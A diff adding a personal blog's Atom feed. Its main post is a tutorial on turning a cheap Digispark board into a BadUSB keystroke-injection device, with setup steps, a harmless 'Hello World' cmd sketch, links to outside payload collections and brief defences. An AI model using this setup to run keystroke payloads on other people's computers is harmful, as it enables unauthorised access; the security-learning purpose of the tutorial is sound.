@@ -1,0 +1,1515 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-us"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://theodorecooper.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://theodorecooper.github.io/" rel="alternate" type="text/html" hreflang="en-us" /><updated>2022-07-21T07:35:42-04:00</updated><id>https://theodorecooper.github.io/feed.xml</id><title type="html">Theodore Cooper</title><subtitle>It's a freak geek's silly site. Theodore Cooper.
+</subtitle><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><entry><title type="html">Fix Updated Blender White Screen After the Render</title><link href="https://theodorecooper.github.io/other/2022-blender-denoise/" rel="alternate" type="text/html" title="Fix Updated Blender White Screen After the Render" /><published>2022-07-21T00:00:00-04:00</published><updated>2022-07-21T07:25:05-04:00</updated><id>https://theodorecooper.github.io/other/blender-denoise</id><content type="html" xml:base="https://theodorecooper.github.io/other/2022-blender-denoise/">&lt;hr /&gt;
+
+&lt;p&gt;After render complete, the image will turn white like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/denoise/render.png&quot; alt=&quot;render&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;the-reason-why&quot;&gt;the Reason why…&lt;/h2&gt;
+
+&lt;p&gt;If you are using the new Blender, image may turn white after the render. The 3.0 new version isn’t compatible with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Denoise&lt;/code&gt; node.&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;Just delete the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Denoise&lt;/code&gt; node then reconnect.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/denoise/before.png&quot; alt=&quot;before&quot; /&gt;
+&lt;img src=&quot;/assets/img/blog/denoise/after.png&quot; alt=&quot;after&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So, if you want to perform a denoise, you can easily enable it in the Render Properties:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/denoise/denoise.png&quot; alt=&quot;denoise&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It looks good now!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/denoise/final.png&quot; alt=&quot;final&quot; /&gt;&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Other" /><category term="Other" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/denoise/cover.jpg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/denoise/cover.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Exploration on USB-Killer | Instantly DESTROY Your PC with High Voltage</title><link href="https://theodorecooper.github.io/pentest/2022-usbkiller/" rel="alternate" type="text/html" title="Exploration on USB-Killer | Instantly DESTROY Your PC with High Voltage" /><published>2022-05-22T00:00:00-04:00</published><updated>2022-05-22T04:39:24-04:00</updated><id>https://theodorecooper.github.io/pentest/usbkiller</id><content type="html" xml:base="https://theodorecooper.github.io/pentest/2022-usbkiller/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A USB Killer is a device that looks similar to a USB thumb drive but instead sends high-voltage power surges into the device it is connected to, which can damage hardware components. Its manufacturers claim the device has been designed to test components for protection from power surges and electrostatic discharge; however, the device is not used for device testing by any major company. The device is often mentioned in articles warning readers against plugging in unknown USB drives.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;usb-pinout&quot;&gt;USB Pinout&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/usb-killer/usb-pinout.jpeg&quot; alt=&quot;pinout&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;intel-minnow-oc-pin&quot;&gt;Intel Minnow OC# Pin&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/usb-killer/oc-pin.png&quot; alt=&quot;OC#-Pin&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ap2172mpg-spec&quot;&gt;AP2172MPG Spec&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.digchip.com/datasheets/download_datasheet.php?id=4572179&amp;amp;part-number=AP2172MPG-13&quot;&gt;https://www.digchip.com/datasheets/download_datasheet.php?id=4572179&amp;amp;part-number=AP2172MPG-13&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;to-be-continued&quot;&gt;To be Continued&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/usb-killer/tobe.jpeg&quot; alt=&quot;to be&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/usb-killer/dire.jpeg&quot; alt=&quot;weide&quot; /&gt;&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Pentest" /><category term="Pentest" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/usb-killer/cover.jpg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/usb-killer/cover.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Awesome Periodic Table of Elements [HTML/CSS]</title><link href="https://theodorecooper.github.io/other/front-end/2022-table/" rel="alternate" type="text/html" title="Awesome Periodic Table of Elements [HTML/CSS]" /><published>2022-05-15T00:00:00-04:00</published><updated>2022-05-15T03:44:09-04:00</updated><id>https://theodorecooper.github.io/other/front-end/table</id><content type="html" xml:base="https://theodorecooper.github.io/other/front-end/2022-table/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;link&quot;&gt;Link:&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://theodorecooper.github.io/assets/html/table/index.html&quot;&gt;https://theodorecooper.github.io/assets/html/table/index.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;gif-preview&quot;&gt;GIF Preview:&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/table/table.gif&quot; alt=&quot;preview&quot; /&gt;&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Other" /><category term="Front-End" /><category term="Other" /><category term="Front-End Dev" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/table/table.jpg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/table/table.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack with a 1.99$ cheap BadUSB — Digispark(ATTINY85)</title><link href="https://theodorecooper.github.io/pentest/2022-badusb/" rel="alternate" type="text/html" title="Hack with a 1.99$ cheap BadUSB — Digispark(ATTINY85)" /><published>2022-05-02T00:00:00-04:00</published><updated>2022-05-02T08:53:01-04:00</updated><id>https://theodorecooper.github.io/pentest/badusb</id><content type="html" xml:base="https://theodorecooper.github.io/pentest/2022-badusb/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;about-badusb&quot;&gt;About BadUSB&lt;/h2&gt;
+
+&lt;p&gt;What is &lt;em&gt;BadUSB&lt;/em&gt;? In short, &lt;em&gt;BadUSB&lt;/em&gt; disguises itself as a human interface device(HID) such as keyboards or mice and covertly executes malicious commands or opens virus payloads on the target computer. One of the terrible things is which takes control over the system using low-level debugging on a certain type of BIOSes.&lt;/p&gt;
+
+&lt;h2 id=&quot;possible-badusb-devices&quot;&gt;Possible BadUSB Devices&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Keyboard;&lt;/li&gt;
+  &lt;li&gt;Network card;&lt;/li&gt;
+  &lt;li&gt;Mouse;&lt;/li&gt;
+  &lt;li&gt;USB charging cables&lt;/li&gt;
+  &lt;li&gt;USB sticks&lt;/li&gt;
+  &lt;li&gt;Anything can be inserted which can be miniaturized into a USB stick form factor.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;what-we-need&quot;&gt;What we need…&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Digispark(ATTINY85) Default - 16.5mhz&lt;/li&gt;
+  &lt;li&gt;Arduino IDE&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;why-use-digispark&quot;&gt;Why use Digispark?&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/badusb/digispark.jpg&quot; alt=&quot;digispark&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;digispark-the-micro-sized-affordable-arduino-enabled-usb-development-board&quot;&gt;Digispark: The micro-sized, affordable, Arduino enabled, USB development board!&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Cheap, very cheap(1~2$)&lt;/li&gt;
+  &lt;li&gt;Tiny enough
+    &lt;ul&gt;
+      &lt;li&gt;Item Weight: 3.53 ounces&lt;/li&gt;
+      &lt;li&gt;The size of a coin&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Easy to program, support Arduino&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The Digispark is an ATtiny85 based microcontroller development board similar to the Arduino line, only cheaper, smaller, and a bit less powerful. With a whole host of shields to extend its functionality and the ability to use the familiar Arduino IDE the Digispark is a great way to jump into electronics, or perfect for when an Arduino is too big or too much.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;step-1-configure-bootloaderwindows&quot;&gt;Step 1: Configure bootloader(Windows)&lt;/h2&gt;
+
+&lt;p&gt;The bootloader is the code that is pre-programmed on your Digispark and allows it to act as a USB device so that it can be programmed by the Arduino IDE.&lt;/p&gt;
+
+&lt;p&gt;You can download bootloader for Windows here(Github):&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip&quot; target=&quot;_blank&quot;&gt;https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/badusb/driver.png&quot; alt=&quot;driver&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Double-click either DPinst64.exe on a 64-bit Windows computer, or DPinst.exe on a 32-bit Windows computer to install the Digispark drivers.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-2-setup-arduino&quot;&gt;Step 2: Setup Arduino&lt;/h2&gt;
+
+&lt;p&gt;Go to &lt;a href=&quot;https://www.arduino.cc/en/Main/Software&quot; target=&quot;_blank&quot;&gt;https://www.arduino.cc/en/Main/Software&lt;/a&gt; download installer. If you are using Linux, there are some more steps:&lt;/p&gt;
+
+&lt;h3 id=&quot;install-arduino-in-linux&quot;&gt;Install Arduino in Linux&lt;/h3&gt;
+
+&lt;p&gt;Download the Linux 64 bits file for 64-bit Linux Intel systems or the Linux 32 bits file for Linux 32-bit Intel systems. Unzip the downloaded file, and extract the folder found in the zipped file to a convenient location. To run the Arduino IDE application, open the extracted folder and double-click the Arduino executable file. To install, run command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh install.sh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;add-linux-user-name-to-the-dialout-group&quot;&gt;Add Linux User Name to the Dialout Group&lt;/h3&gt;
+
+&lt;p&gt;In order to be able to program any board from the Arduino IDE, the Linux user must be added to the dialout group.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;adduser &lt;span class=&quot;nv&quot;&gt;$USER&lt;/span&gt; dialout
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Enter your Linux password when prompted.&lt;/p&gt;
+
+&lt;p&gt;You will need to log out and then log back in, or reboot, for the changes to take effect.&lt;/p&gt;
+
+&lt;h3 id=&quot;add-udev-rules-to-the-system&quot;&gt;Add udev Rules to the System&lt;/h3&gt;
+
+&lt;p&gt;To be able to program the Digispark board from the Arduino IDE in Linux, udev rules must be added to the system. This is done by creating a file in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/udev/rules.d/&lt;/code&gt; that contains the rules.&lt;/p&gt;
+
+&lt;p&gt;Create a text file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;49-micronucleus.rules&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/udev/rules.d/&lt;/code&gt; and add the following rules to it(&lt;strong&gt;you will need root permission&lt;/strong&gt;).&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# UDEV Rules for Micronucleus boards including the Digispark.
+# This file must be placed at:
+#
+# /etc/udev/rules.d/49-micronucleus.rules    (preferred location)
+#   or
+# /lib/udev/rules.d/49-micronucleus.rules    (req'd on some broken systems)
+#
+# After this file is copied, physically unplug and reconnect the board.
+#
+SUBSYSTEMS==&quot;usb&quot;, ATTRS{idVendor}==&quot;16d0&quot;, ATTRS{idProduct}==&quot;0753&quot;, MODE:=&quot;0666&quot;
+KERNEL==&quot;ttyACM*&quot;, ATTRS{idVendor}==&quot;16d0&quot;, ATTRS{idProduct}==&quot;0753&quot;, MODE:=&quot;0666&quot;, ENV{ID_MM_DEVICE_IGNORE}=&quot;1&quot;
+#
+# If you share your linux system with other users, or just don't like the
+# idea of write permission for everybody, you can replace MODE:=&quot;0666&quot; with
+# OWNER:=&quot;yourusername&quot; to create the device owned by you, or with
+# GROUP:=&quot;somegroupname&quot; and mange access using standard unix groups.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;step-3-add-digispark-package&quot;&gt;Step 3: Add Digispark Package&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Run the Arduino application.&lt;/li&gt;
+  &lt;li&gt;In the Arduino application go to the “File” menu and select “Preferences”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/badusb/perf.png&quot; alt=&quot;perf.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;In the box labeled “Additional Boards Manager URLs” enter:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://digistump.com/package_digistump_index.json
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/badusb/perf_1.png&quot; alt=&quot;perf_1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Click OK&lt;/li&gt;
+  &lt;li&gt;Go to the “Tools” menu and then the “Board” submenu - select “Boards Manager” and then from the type drop down select “Contributed”&lt;/li&gt;
+  &lt;li&gt;Select the “Digistump AVR Boards” package and click the “Install” button.&lt;/li&gt;
+  &lt;li&gt;With the install complete, close the “Boards Manager” window and select the Digispark from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tools→Boards&lt;/code&gt; menu. Select &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Digispark (Default - 16.5mhz)&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;step-4-programming-the-badusb&quot;&gt;Step 4: Programming the BadUSB&lt;/h2&gt;
+
+&lt;p&gt;We should first program a sketch first, here’s a simple example:&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//This DigiKeyboard Script opens a cmd window and echo 'Hello World!'&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;#include &quot;DigiKeyboard.h&quot;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_R&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MOD_GUI_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo Hello World&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;//empty&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then click &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Upload&lt;/code&gt; and insert the Digispark. Wait for the script to finish uploading. When the “Micronucleus done. Thank you!” message appears, it means that the script has finished uploading and you can unplug your BadUSB.&lt;/p&gt;
+
+&lt;h2 id=&quot;some-scripts-you-may-need&quot;&gt;Some Scripts You may Need:&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/theodorecooper/awesome-badusb&quot; target=&quot;_blank&quot;&gt;https://github.com/theodorecooper/awesome-badusb&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/MTK911/Attiny85/tree/master/payloads&quot; target=&quot;_blank&quot;&gt;https://github.com/MTK911/Attiny85/tree/master/payloads&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;how-to-defense&quot;&gt;How to Defense?&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Egress filtering in Firewalls.&lt;/li&gt;
+  &lt;li&gt;Physically block USB Ports.&lt;/li&gt;
+  &lt;li&gt;Disable automatic installation of new USB devices.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;more-you-may-wanna-know&quot;&gt;More You may Wanna Know…&lt;/h2&gt;
+
+&lt;h3 id=&quot;digispark-pin-usage-guide&quot;&gt;Digispark Pin Usage Guide&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Pin Number&lt;/th&gt;
+      &lt;th&gt;Output Voltage&lt;/th&gt;
+      &lt;th&gt;Analogue Port Number analogRead()&lt;/th&gt;
+      &lt;th&gt;PWM&lt;/th&gt;
+      &lt;th&gt;USB&lt;/th&gt;
+      &lt;th&gt;Test LED&lt;/th&gt;
+      &lt;th&gt;I2C&lt;/th&gt;
+      &lt;th&gt;SPI*&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;5V&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Y - 504 Hz&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Rev 1&lt;/td&gt;
+      &lt;td&gt;SDA&lt;/td&gt;
+      &lt;td&gt;MISO&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1&lt;/td&gt;
+      &lt;td&gt;5V&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Y - 504 Hz&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Rev 2 / 4&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;MISO&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt;5V&lt;/td&gt;
+      &lt;td&gt;1&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;SCL&lt;/td&gt;
+      &lt;td&gt;SCK&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;3&lt;/td&gt;
+      &lt;td&gt;3.6V&lt;/td&gt;
+      &lt;td&gt;3&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Y - 1.5k Ohm to 5 V&lt;br /&gt;Zener diode (3.6 V maximum in- &amp;amp; output)&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;3.6V&lt;/td&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt;Y - 1007 Hz&lt;/td&gt;
+      &lt;td&gt;Y Zener diode (3.6 V maximum in- &amp;amp; output)&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5&lt;/td&gt;
+      &lt;td&gt;3V&lt;/td&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;*Note that the labeling of the pins for SPI is somewhat misleading. The table above is correct, as MISO is actually DI and MOSI is DO, but for use with ISP MISO and MOSI are swapped.&lt;/p&gt;
+
+&lt;h3 id=&quot;digispark-pro-pin-usage-guide&quot;&gt;Digispark Pro Pin Usage Guide&lt;/h3&gt;
+
+&lt;p&gt;This table details the function of each pin on the Digispark Pro and any notes the are relevant.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt; &lt;/th&gt;
+      &lt;th&gt;Pin Number&lt;/th&gt;
+      &lt;th&gt;Output Voltage&lt;/th&gt;
+      &lt;th&gt;ADC&lt;/th&gt;
+      &lt;th&gt;PWM&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;VCC&lt;/td&gt;
+      &lt;td&gt;VCC&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SDA&lt;/td&gt;
+      &lt;td&gt;0   SDA&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Y&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;LED&lt;/td&gt;
+      &lt;td&gt;1   LED&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Y&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SCL&lt;/td&gt;
+      &lt;td&gt;2   SCL&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Y&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;USB+&lt;/td&gt;
+      &lt;td&gt;3   USB+&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt;A3&lt;/td&gt;
+      &lt;td&gt;Y&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;USB-&lt;/td&gt;
+      &lt;td&gt;4   USB-&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Y&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Pin 5&lt;/td&gt;
+      &lt;td&gt;5&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt;A5&lt;/td&gt;
+      &lt;td&gt;Y&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;GND&lt;/td&gt;
+      &lt;td&gt;GND&lt;/td&gt;
+      &lt;td&gt;0v&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;VIN&lt;/td&gt;
+      &lt;td&gt;VIN(6-16v)&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;RX&lt;/td&gt;
+      &lt;td&gt;6   RX&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt;A6&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;TX&lt;/td&gt;
+      &lt;td&gt;7   TX&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt;A7&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;MISO&lt;/td&gt;
+      &lt;td&gt;8   MISO&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt;A8&lt;/td&gt;
+      &lt;td&gt;Y&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;INT1&lt;/td&gt;
+      &lt;td&gt;9   INT1&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt;A9&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;MOSI&lt;/td&gt;
+      &lt;td&gt;10  MOSI&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt;A10&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SCK&lt;/td&gt;
+      &lt;td&gt;11  SCK&lt;/td&gt;
